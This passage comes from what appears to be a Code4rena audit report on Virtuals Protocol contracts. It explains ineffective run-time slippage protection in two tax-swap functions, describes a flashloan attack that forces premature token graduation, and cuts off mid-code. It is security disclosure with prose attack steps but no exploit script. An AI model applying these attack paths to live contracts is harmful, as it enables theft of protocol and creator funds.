href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-242\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-290\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-182\"\u003ejoicygiore\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-131\"\u003emaze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-83\"\u003embuba666\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-293\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-433\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-377\"\u003etestnate\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-237\"\u003evasilishte\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-3\" aria-label=\"finding description 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eAutomated Market Makers define the price of asset based on a pool of two assets. The ratio at which they exchange, is defined by a curve of constant product. Except when liquidity is proportionally increased for both, the expected behaviour is that as one increases, the other decreases.\u003c/p\u003e\n\u003cp\u003eIn a pair of \u003ccode\u003etoken A\u003c/code\u003e and \u003ccode\u003etoken B\u003c/code\u003e, if a user deposits the first token, the amount he would receive of the second token is defined as the amount of the other token (\u003ccode\u003etoken B\u003c/code\u003e) that we have to take away for their product to remain constant. Thus, every time a swap occurs, prices does even if slightly, change.\u003c/p\u003e\n\u003cp\u003eSometimes before a transaction occurs, users could have also called (and executed) a swap before us, adversely affecting the price ratio (and if the liquidity of the pool is low, that might be even more noticeable). This is an adverse situation we call slippage. To protect against that, some protocols take a minimum amount out.\u003c/p\u003e\n\u003cp\u003eHowever, this protection only makes sense (as the risk it protects against) from outside the transaction in which it occurs. Because once the transaction is executing, unless we work with reentrant tokens or something akin to that, the price we are going to work with is the same one that is being used to calculate slippage protection.\u003c/p\u003e\n\u003cp\u003eCalculating a percentage of acceptable loss from a price fetched at the time of execution then is of no use, since that is already the price that we will be exposed to, be it acceptable or not.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eBondingTax\u003c/code\u003e, the \u003ccode\u003eBondingTax::SwapForAsset\u003c/code\u003e function looks like this:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount = IERC20(taxToken).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amount \u0026gt; 0, \u0026quot;Nothing to be swapped\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (amount \u0026lt; minSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (amount \u0026gt; maxSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            amount = maxSwapThreshold;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address[] memory path = new address[](2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        path[0] = taxToken;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        path[1] = assetToken;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit this gets whatever the price already is at execution\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amountsOut.length \u0026gt; 1, \u0026quot;Failed to fetch token price\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 expectedOutput = amountsOut[1]; //@audit no protection\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        try router.swapExactTokensForTokens(amount, minOutput, path, treasury, block.timestamp + 300) returns (\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256[] memory amounts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            emit SwapExecuted(amount, amounts[1]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (true, amounts[1]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        } catch {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            emit SwapFailed(amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere we see that the output is calculated from the price the function fetches at execution time:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit calculated from current price\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amountsOut.length \u0026gt; 1, \u0026quot;Failed to fetch token price\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 expectedOutput = amountsOut[1]; //@audit expected output is calculated from amountsOut\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis protection is insufficient. A similar implementation is tried in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function dcaSell(uint256[] memory agentIds, uint256 slippage, uint256 maxOverride) public onlyRole(EXECUTOR_ROLE) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(slippage \u0026lt;= DENOM, \u0026quot;Invalid slippage\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 agentId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint i = 0; i \u0026lt; agentIds.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            agentId = agentIds[i];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            TaxAmounts memory agentAmounts = agentTaxAmounts[agentId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 amountToSwap = agentAmounts.amountCollected - agentAmounts.amountSwapped;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (amountToSwap \u0026gt; maxOverride) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                amountToSwap = maxOverride; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            uint256 minOutput = ((amountToSwap * (DENOM - slippage)) / DENOM);  //@audit slippage is received as a ratio here\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            _swapForAsset(agentId, minOutput, maxOverride);  //@audit a ratio over the price at execution\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn both cases, the slippage protection is calculated at run-time. And that’s not a good enough protection against strong price or market movements occurring immediately before our call to uniswap is performed.\u003c/p\u003e\n\u003ch3 id=\"impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe risk at which the protocol is exposed thus, is that price movements could lead to swap being executed at not acceptable prices brought by market dynamics, with no protection. The protocol might lose part of the funds that are meant to go to their treasure in the swap, or creators of \u003ccode\u003esentient\u003c/code\u003e categorized agents might lose part of their trading fees earned.\nGiven that for now there is no public transaction pool in BASE, the severity might be deserving of medium.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eI think there are more than one considerations to make here.\u003c/p\u003e\n\u003cp\u003eGiven that the purpose of one of these functions \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e is executing many swaps in a loop, setting a single slippage protection inside the call could be not ideal, as the transactions run one after the other; and if the last one hits slippage, all of them get a revert (but could be chosen if that behaviour is desired).\u003c/p\u003e\n\u003cp\u003eAlso, the other of the mentioned functions (\u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e) is meant to be called by another contract at execution (\u003ccode\u003eFRouter::buy\u003c/code\u003e and \u003ccode\u003eFRouter::sell\u003c/code\u003e, to handle fees), thus passing slippage protection parameters as an argument might be difficult.\u003c/p\u003e\n\u003cp\u003eSome solutions could be:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFor \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e, use a current starting price associated with a \u003ccode\u003eTaxToken\u003c/code\u003e at which execution of swap is acceptable to pass as an argument, and revert if it isn’t met.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTo get the current price at execution time, \u003ccode\u003eIUniswapV2Router01::getAmountsOut\u003c/code\u003e could be used, passing a reference value as amount, and then calculating the price from it and the value returned, to compare it with the argument and check slippage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFor \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the calls inside \u003ccode\u003eFRouter::buy\u003c/code\u003e and \u003ccode\u003eFRouter::sell\u003c/code\u003e could be removed, the implementation could also be similar as that suggested for \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e. \u003c/li\u003e\n\u003cli\u003eOtherwise, you could set in the contract a minimum acceptable price (or a series of them, if you were to implement many \u003ccode\u003etaxTokens\u003c/code\u003e, for both contracts) in which you would consider more important to avoid the slippage lose than having the swap fail in the try-catch.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eBondingTax::SwapForAsset\u003c/code\u003e is called by the bondingRouter, to swap a \u003ccode\u003etaxToken\u003c/code\u003e for the \u003ccode\u003eAssetToken\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSomeone makes a very big swap exactly before the call in relevant pool.\u003c/li\u003e\n\u003cli\u003eThe call executes.\u003c/li\u003e\n\u003cli\u003eWe swapped fees cheaply.\u003c/li\u003e\n\u003cli\u003eAfter our swap the price gets a correction rather quickly to its average, but we already made the swap at a disadvantageous price.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eAnd in the other case:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e is called to process taxes.\u003c/li\u003e\n\u003cli\u003eSomeone makes a very big swap exactly before the call in relevant pool.\u003c/li\u003e\n\u003cli\u003eSince slippage protection intends to be calculated at run-time, it never hits, even though the price could have dropped very significantly. So our call executes.\u003c/li\u003e\n\u003cli\u003eSwaps are performed successfully, and the protocol and the creators of agents would lose a significant part of their fees.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\" aria-label=\"m 04 launched tokens are vulnerable to flashloan attacks forcing premature graduation allowing reward manipulation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-12\"\u003e[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-246\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-20\"\u003embuba666\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eBonding.sol only allows a launched memecoin to graduate when \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L350\"\u003e\u003ccode\u003egradThreshold\u003c/code\u003e\u003c/a\u003e is met and enough liquidity (\u003ccode\u003eassetToken\u003c/code\u003e balance) is gained through the investor community trading. This ensures the price stability of the \u003ccode\u003eagentToken\u003c/code\u003e upon graduation.\u003c/p\u003e\n\u003cp\u003eThe vulnerability is that current implementation allows the investor community trading to be bypassed by flashloan attack. A malicious founder or founder controlled account can force graduate a token with a flashloan and gain exposure to reward emissions.\u003c/p\u003e\n\u003cp\u003eThe key attack vector: \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L318\"\u003e\u003ccode\u003ebuy()\u003c/code\u003e\u003c/a\u003e memecoin with flashloaned virtual tokens (e.g. from already deployed uniswapV2pairs or other pools with virtual) → sell atomically in newly deployed uniswapV2pair. This forces graduation of a freshly deployed memecoin with no community support.\u003c/p\u003e\n\u003cp\u003eThe key vulnerable code that enable the attack is \u003ccode\u003eupwrapToken()\u003c/code\u003e which allows converting memecoins to \u003ccode\u003eagentTokens\u003c/code\u003e do not have any time-based restrictions, allowing atomic unwrap upon graduation. A flashloan loop can be closed atomically through \u003ccode\u003eunwrapToken\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//contracts/fun/Bonding.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eunwrapToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etradingOnUniswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Token is not graduated yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan 